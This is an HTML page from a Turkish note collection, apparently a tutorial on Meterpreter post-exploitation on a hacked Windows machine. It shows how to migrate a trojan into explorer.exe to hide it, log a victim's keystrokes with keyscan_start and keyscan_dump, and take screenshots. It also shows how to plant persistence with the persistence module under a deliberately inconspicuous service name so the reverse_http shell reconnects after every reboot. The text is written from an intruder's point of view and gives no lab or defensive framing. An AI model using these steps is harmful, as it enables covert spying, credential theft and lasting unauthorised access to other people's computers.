<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>meterpreter</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>meterpreter</h1><br/><br /><strong><span style="color:#e01b24;">Bağlantı (hack) sonrası yapılacaklar</span></strong><br /><br /><img src="images/53-1.png" alt="images/53-1.png" /><br /><br /><strong><span style="color:#c01c28;">migrate (işlem göçü)</span></strong><br /><br />  migrate bizim backdoor olarak oluşturduğumuz ve halihazırda çalışan trojanımızı, çalışan başka bir exe içine gömerek trojanımızın gizlenmesini sağlayan bir yöntemdir. Şimdi sızmış olduğumuz bir windows cihazda “ps” komutu ile çalışan programladı listeleyelim;<br /><br /><img src="images/53-2.png" alt="images/53-2.png" /><br /><br /> Burada da görüldüğü gibi “PID” yani ilk sütunda olan process id kısmını kullanarak kendi trojanımızı migrate edebileceğiz. <br /> Şimdi windows da dosya sistemini görüntülemeye yarayan “explorer.exe” nin PID sini kullanarak migrate yapacağız.<br /><br /><img src="images/53-3.png" alt="images/53-3.png" />burada ki “2824” “explorer.exe” nin PID si idi ve “migrate 2824” yazıp trojanımızı migrate ettik.<br /><br /><strong>NOT:</strong> <span style="color:#c01c28;">“migrate” işlemi hacklenen bir cihazda ilk yapılması gerekilen işlemlerden biridir!</span><br /><br /><strong><span style="color:#c01c28;">Meterpreter ile Keylogger(keystroke) çalıştırmak</span></strong><br /><br />Keylogger yani klavyeden girilen değerleri dinlemek için aşağıda ki komutu kullanarak başlatabiliriz;<br /><br /><img src="images/53-4.png" alt="images/53-4.png" />&quot;keyscan_start&quot; komutu ile keystroke sniffer yani klayvede basılan tuşları takip etmeye başladık. Eğer bu komuttan sonra basılan bütün klayve tuşlarını yani yazılanları görmek istiyorsak aşağıda ki komutu kullanıyoruz;<br /><br /><img src="images/53-5.png" alt="images/53-5.png" />&quot;keyscan_start&quot; komutu ile başlattıktan sonra hacklenen makinede basılan tüm klavye tuşlarını görmek için resimde de gördüğümüz üzere  “keyscan_dump” yazmamız yeterli.<br /><br /><strong><span style="color:#c01c28;">Screenshot almak</span></strong><br /><br /><img src="images/53-6.png" alt="images/53-6.png" />&quot;screenshot&quot; komutunu yazmamız yeterli.<br /><br /><strong><span style="color:#c01c28;">Hacklenen Cihazda Kalıcı Hale Gelmek</span></strong><br /><br /> Öncelikle hacklediğimiz cihazda açmış olduğumuz session menüsünden bir önceki menüye <img src="images/53-7.png" alt="images/53-7.png" /> “background” komutu ile dönüyoruz.  Geri dönmemizin nedeni payload değiştirecek olmamız, çünkü farklı bir payload kullanacağız.<br /><br /><img src="images/53-8.png" alt="images/53-8.png" /><br /><br />  Yukarıda da görüldüğü gibi “use exploit/windows/local/persistence” persistence yani türkçe manası ile süreklilik, kalıcılık payload&#39;ını kullanmaya (&quot;use&quot;) başlıyoruz. Bu payload bizim trojanımızı bu cihaza service olarak enjekte etmemize yarıyor. Bu sayede hacklenen cihaz bilgisayarını her açıp internete bağlandığında cihaza yeniden erişim sağlayabileceğiz, hatta trojan bulunan exe dosyasını silse bile! Çünkü trojanımızı pc her açıldığında çalışacak şekilde bir service içine enjekte ediyoruz. Böylelikle bu cihazda kalıcı hale gelmiş oluyoruz. <br /><br /> Şimdi persistence payload&#39;ının options kısmında bazı değişiklikler yapalım;<br /> <br /> <img src="images/53-9.png" alt="images/53-9.png" /> &quot;set EXE_NAME winexplore.exe&quot; diyerek “winexplore.exe” adında bir service içine trojanımızı enjekte edeceğimizi ayarladık. Burada ki  “winexplore.exe” adını biz verdik, yani herhangi bir isim verebiliriz. Dikkat çekmesin diye  “winexplore.exe” dedik.<br /> <br /> Ardından hangi session için bunu yapmak istediğimizi seçiyoruz (o an hangi session da karşı makinaya bağlıysak onun ID&#39;si);<br /> <img src="images/53-10.png" alt="images/53-10.png" />&quot;set SESSION 1&quot; diyerek session kısmını da belirledik.<br /> <br /> Eğer istersek custom olarak kendi cihazımızda bulunan kendi oluşturduğumuz trojanı kullanmak istiyorsak bir değişiklik yapmamız gerekir. Bunun için “show advanced” komutu ile aşağıda ki kısmı açıyoruz;<br /> <br /> <img src="images/53-11.png" alt="images/53-11.png" /><br /> <br /> ardından yukarıda ki resimde görüldüğü gibi “set EXE::Custom” komutunu kullanıp arından /var/www/html/bacdoors.... (kendi cihazımızda trojanı nereye koyduysak .exe uzantısına kadar yazıyoruz) şeklinde trojanın yerini belirtiyoruz.<br /> NOT: <span style="color:#c01c28;">Bunu yapmakta ki amacımız; eğer bunu yapmazsak sistem kendi oluşturduğu bir default trojan ekler, bizim trojanımızı değil.</span><br /> <br /> Ayarı kontrol etmek için tekrar “show advanced” diyoruz ve;<br /> <br /> <img src="images/53-12.png" alt="images/53-12.png" /><br /> <br /> EXE::Custom kısmında gördüğümüz gibi ayarımız geçerli olmuş.<br /> <br /> Artık enjekte etmeye hazırız ve “exploit” komutu ile enjekte etmeyi başlatabiliriz;<br /> <img src="images/53-13.png" alt="images/53-13.png" /><br /> <br /> &quot;exploit&quot; komutu sonrası bu şekilde bir ekran gelirse başarılı olmuş demektir. <br /> <br /> <br /> <br /> Bundan sonra artık hangi yöntem ile hacklediysek eriştiysek ona dönebiliriz;<br /> <br /> <img src="images/53-14.png" alt="images/53-14.png" /><br /> <br />  burda “reverse_http” kullanılmış o yüzden “<span style="color:#57e389;">use exploit/multi/handler</span>” diyip “<span style="color:#57e389;">set PAYLOAD windows/meterpreter/reverse_http</span>” diyip hacklediğimiz payload&#39;a geri dönüyoruz. <br /> <br />  Artık bundan sonra nasılsa önceden exploit ettik üstüne birde persistence kullanarak cihazda kalıcı hale geldiğimize göre, cihaz kapanıp açılsa bile açıldıktan ve internete bağlandıktan 10 saniye sonra (default olarak 10 saniye belirlenmişti istersek onu da değiştirebiliyoruz) reverse_http yöntemi ile oluşturduğumuz trojanımızı, ismini kendimiz belirlediğimiz ve içine kendi trojanımızı enjekte ettiğimiz (&quot;persistence&quot; payloadı ile) bir service (service adına &quot;winexplore.exe&quot; demiştik) sayesinde bizim cihazımıza bağlanacak. <br /> </div>
</body>
</html>
